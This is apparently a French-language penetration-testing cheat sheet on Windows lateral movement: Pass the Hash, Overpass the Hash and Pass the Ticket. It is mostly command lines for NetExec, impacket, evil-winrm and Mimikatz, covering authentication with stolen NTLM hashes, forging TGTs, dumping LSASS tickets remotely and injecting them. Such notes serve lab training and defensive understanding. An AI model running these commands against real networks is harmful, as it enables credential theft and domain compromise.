# Pass the Hash (PtH)

Authentification avec le hash NTLM directement, sans le mot de passe en clair. Fonctionne uniquement avec **NTLM** -  pas avec Kerberos.

> Limitation : depuis le patch 2014, PtH ne fonctionne qu'avec le compte **Administrator local intégré** (RID 500) et les comptes de domaine. Les autres comptes admin locaux sont bloqués par défaut.

**NetExec**

```bash
# SMB
nxc smb 'IP' -u Administrator -H ''NTLM_HASH''

# WinRM
nxc winrm 'IP' -u Administrator -H ''NTLM_HASH''

# RDP
nxc rdp 'IP' -u Administrator -H ''NTLM_HASH''

# LDAP
nxc ldap 'IP' -u Administrator -H ''NTLM_HASH''
```

**impacket**

```bash
# shell via WMI
impacket-wmiexec -hashes :''NTLM_HASH'' 'USER'@'IP_CIBLE'

# shell via PsExec (crée un service)
impacket-psexec -hashes :''NTLM_HASH'' 'USER'@'IP_CIBLE'

# smbclient
impacket-smbclient -hashes :''NTLM_HASH'' 'USER'@'IP_CIBLE'
```

**evil-winrm**

```bash
evil-winrm -i <IP_CIBLE> -u Administrator -H '<NTLM_HASH>'
```

# Overpass the Hash

Convertit un **hash NTLM** en **TGT Kerberos**. Utile quand NTLM est bloqué, ou pour utiliser des outils Kerberos uniquement (PsExec Sysinternals original, etc.).

> Le KDC délivre ensuite les TGS automatiquement à partir du TGT pour chaque service demandé.

**Linux**

Obtenir le TGT

```bash
# impacket
impacket-getTGT corp.com/'USER' -hashes :'NTLM_HASH' -dc-ip 'IP_DC'

# nxc
nxc smb 'IP_DC' -u 'USER' -H 'NTLM_HASH' --generate-tgt /tmp/'USER'.ccache
```

Utiliser le TGT

```bash
export KRB5CCNAME=/tmp/<USER>.ccache

# impacket (-target-ip si le hostname ne résout pas sur Kali)
impacket-psexec -k -no-pass corp.com/'USER'@'HOSTNAME' -dc-ip 'IP_DC' -target-ip 'IP_CIBLE'
impacket-wmiexec -k -no-pass corp.com/'USER'@'HOSTNAME' -dc-ip 'IP_DC' -target-ip 'IP_CIBLE'
impacket-smbclient -k -no-pass corp.com/'USER'@'HOSTNAME' -dc-ip 'IP_DC' -target-ip 'IP_CIBLE'
impacket-secretsdump -k -no-pass corp.com/'USER'@'HOSTNAME_DC' -dc-ip 'IP_DC' -target-ip 'IP_DC'

# nxc
nxc smb 'IP_CIBLE' -u 'USER' -k --use-kcache --kdcHost 'IP_DC'
```

**Windows (Mimikatz)**

```
sekurlsa::pth /user:<USER> /domain:corp.com /ntlm:<NTLM_HASH> /run:powershell
```

Spawne un PowerShell. Déclencher un AS-REQ pour générer le TGT en mémoire :

```powershell
net use \\<HOSTNAME>   # force l'obtention du TGT
klist                  # vérifier
.\PsExec.exe \\<HOSTNAME> cmd
```

**Lire la sortie de `klist`**

| Champ | TGT | TGS |
|---|---|---|
| `Server` | `krbtgt/CORP.COM` | `cifs/files04`, `http/web04`… |
| `Ticket Flags` | contient `initial` | pas de flag `initial` |
| Obtenu via | AS-REQ (1ère étape) | TGS-REQ (échange du TGT) |

> `forwardable` = le ticket peut être transmis à un autre service (attention en contexte de délégation Kerberos non contrainte).

# Pass the Ticket (PtT)

Voler un TGT ou TGS depuis la mémoire LSASS d'une machine et l'utiliser dans une autre session. Contrairement à PtH et Overpass the Hash, on réutilise un **ticket déjà émis** -  utile quand on n'a pas le hash du compte cible.

> Le TGT est réutilisable pour n'importe quel service pendant ~10h. Le TGS est limité au service pour lequel il a été émis.

**Linux (nxc + lsassy)**

1. Extraire les tickets de LSASS à distance
```bash
nxc smb 'IP_CIBLE' -u 'USER' -H 'NTLM_HASH' -M lsassy
```

2. Choisir et charger le ticket
```bash
ls -l ~/.nxc/modules/lsassy/
# Format des fichiers : TYPE_DOMAINE_USER_SERVICE_CIBLE_ID_IP_TIMESTAMP.ccache

# TGS_CORP.COM_dave_cifs_web04_[...].ccache  → accès SMB à web04
# TGS_CORP.COM_dave_ldap_dc1_[...].ccache   → accès LDAP au DC
# TGT_CORP.COM_dave_krbtgt_[...].ccache     → TGT réutilisable pour tout service

export KRB5CCNAME='/home/kali/.nxc/modules/lsassy/TG[...].ccache'
```

3. Utiliser le ticket
```bash
nxc smb 'IP_CIBLE' -u 'USER' -k --use-kcache --kdcHost 'IP_DC'
```

**Windows (Mimikatz)**

```
# 1. Exporter tous les tickets en .kirbi
privilege::debug
sekurlsa::tickets /export

# 2. Injecter le ticket choisi
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi

# 3. Vérifier et utiliser
klist
ls \\web04\backup
```
